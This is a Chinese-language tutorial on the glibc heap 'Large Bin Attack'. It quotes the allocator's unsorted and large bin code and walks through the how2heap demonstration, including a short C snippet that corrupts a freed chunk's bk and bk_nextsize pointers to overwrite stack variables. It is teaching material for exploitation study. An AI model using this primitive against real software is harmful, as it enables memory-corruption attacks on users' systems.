# Large Bin Attack

## 介绍

Large Bin Attack 可以用来修改任意地址的值。例如用来修改 global_max_fast 进而做下一步的 fast bin attack。



```c
while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
{
    bck = victim->bk;
    if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
        || __builtin_expect (chunksize_nomask (victim)
                   > av->system_mem, 0))
            malloc_printerr (check_action, "malloc(): memory corruption",
                             chunk2mem (victim), av);
    size = chunksize (victim);
 
    /*
      If a small request, try to use last remainder if it is the
      only chunk in unsorted bin.  This helps promote locality for
      runs of consecutive small requests. This is the only
      exception to best-fit, and applies only when there is
      no exact fit for a small chunk.
    */
 
    if (in_smallbin_range (nb) &&
        bck == unsorted_chunks (av) &&
        victim == av->last_remainder &&
        (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
    {
        /* split and reattach remainder */
        remainder_size = size - nb;
        remainder = chunk_at_offset (victim, nb);
        unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
        av->last_remainder = remainder;
        remainder->bk = remainder->fd = unsorted_chunks (av);
        if (!in_smallbin_range (remainder_size))
        {
            remainder->fd_nextsize = NULL;
            remainder->bk_nextsize = NULL;
        }
 
        set_head (victim, nb | PREV_INUSE |
                  (av != &main_arena ? NON_MAIN_ARENA : 0));
        set_head (remainder, remainder_size | PREV_INUSE);
        set_foot (remainder, remainder_size);
 
        check_malloced_chunk (av, victim, nb);
        void *p = chunk2mem (victim);
        alloc_perturb (p, bytes);
        return p;
    }
 
    /* remove from unsorted list */
    unsorted_chunks (av)->bk = bck;
    bck->fd = unsorted_chunks (av);
 
    /* Take now instead of binning if exact fit */
 
    if (size == nb)
    {
         set_inuse_bit_at_offset (victim, size);
         if (av != &main_arena)
             set_non_main_arena (victim);
         check_malloced_chunk (av, victim, nb);
         void *p = chunk2mem (victim);
         alloc_perturb (p, bytes);
         return p;
    }
 
    /* place chunk in bin */
    if (in_smallbin_range (size))
    {
        victim_index = smallbin_index (size);
        bck = bin_at (av, victim_index);
        fwd = bck->fd;
    }
    else
    {
        victim_index = largebin_index (size);
        bck = bin_at (av, victim_index);
        fwd = bck->fd;
 
        /* maintain large bins in sorted order */
        if (fwd != bck)
        {
             /* Or with inuse bit to speed comparisons */
             size |= PREV_INUSE;
             /* if smaller than smallest, bypass loop below */
             assert (chunk_main_arena (bck->bk));
             if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))
             {
                 fwd = bck;
                 bck = bck->bk;
                 victim->fd_nextsize = fwd->fd;
                 victim->bk_nextsize = fwd->fd->bk_nextsize;
                 fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
              }
              else
              {
                  assert (chunk_main_arena (fwd));
                  while ((unsigned long) size < chunksize_nomask (fwd))
                  {
                      fwd = fwd->fd_nextsize;
                      assert (chunk_main_arena (fwd));
                  }
 
                  if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                  else
                  {
                      victim->fd_nextsize = fwd;
                      victim->bk_nextsize = fwd->bk_nextsize;
                      fwd->bk_nextsize = victim;
                      victim->bk_nextsize->fd_nextsize = victim;
                  }
                  bck = fwd->bk;
              }
          }
          else
              victim->fd_nextsize = victim->bk_nextsize = victim;
    }
 
 
 
    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;
 
#define MAX_ITERS       10000
    if (++iters >= MAX_ITERS)
        break;
}

```

与 largebin相关的代码如上，我们利用的主要核心代码是如下分支：

当不满足 `if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))` 条件的时候

```c
                  if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                  else
                  {
                      victim->fd_nextsize = fwd;
                      victim->bk_nextsize = fwd->bk_nextsize;
                      fwd->bk_nextsize = victim;
                      victim->bk_nextsize->fd_nextsize = victim;
                  }

```



## 例子

### 0x1 how2heap：large_bin_attack

我们构造出如下情景：

```bash
PwnLife> parseheap
addr                prev                size                 status              fd                bk
0x603000            0x0                 0xa0                 Used                None              None
0x6030a0            0x0                 0x290                Freed     0x7ffff7dd1b58          0x6037a0
0x603330            0x290               0x30                 Used                None              None
0x603360            0x0                 0x410                Freed     0x7ffff7dd1f48    0x7ffff7dd1f48
0x603770            0x410               0x30                 Used                None              None
0x6037a0            0x0                 0x410                Freed           0x6030a0    0x7ffff7dd1b58
0x603bb0            0x410               0x30                 Used                None              None
```

此时 chunk 情景如下：

```bash
                  top: 0x603be0 (size : 0x20420)
       last_remainder: 0x6030a0 (size : 0x290)
            unsortbin: 0x6037a0 (size : 0x410) <--> 0x6030a0 (size : 0x290)
         largebin[ 0]: 0x603360 (size : 0x410)
```

unsortbin :

```bash
+----------------------------------------+
|                                        |
|                                        |
|               +-------------+          |
|               |             |          v
|      P3       v             |    P1
|         +-----+------+      |     +------------+
|         |            |      |     |            |
|         |            |      |     |            |
|         +------------+      |     +------------+
|         |            |      |     |            |
|         | size:0x410 |      |     | size:0x290 |
|         +------------+      |     +------------+
|         |            |      |     |            |
+-----------+   fd     |      |     |            |
          +------------+      |     +------------+
          |            |      |     |            |
          |            |      +---------+ bk     |
          +------------+            +------------+
```

接着我们通过某种漏洞修改 P2 的 chunk：

```c
    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);
```

然后我们 malloc 一块新的chunk，此时，由于此时 fastbin 为空，程序遍历 unsorte bin，当时此时unsorte bin里的 chunk 为 large bin 的时候，首先判断当前的chunk size是不是小于bck->bk的size，也就是large bin里最小的chunk，如果是，直接添加到末尾。如果不是，就正向遍历large bin，直到找到一个chunk的size小于等于当前chunk size（large bin的chunk是从大到小正向排列的）。然后将当前的chunk插入到large bin的两个链表中。

large bin chunk里的`fd_nextsize`指向的是链表中第一个比自己小的chunk，`bk_nextsize`指向第一个比自己大的chunk。



而此时我们 largebin 只有一个chunk，且当前 当前 chunk size为 0x290 小于 largebin 里chunk 的大小，首先将unsorted bin 里的 chunk 置入 large bin，进而去遍历 large bin，此时发现 fwd chunk 不符合` if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))` 这个条件时：

```c
    [...]

              else
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;

    [...]

    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;
```

fwd 此时就为 P2 ， victim 就是 P3 ，此时就能将栈上的两个变量也被修改成了 `victim`。

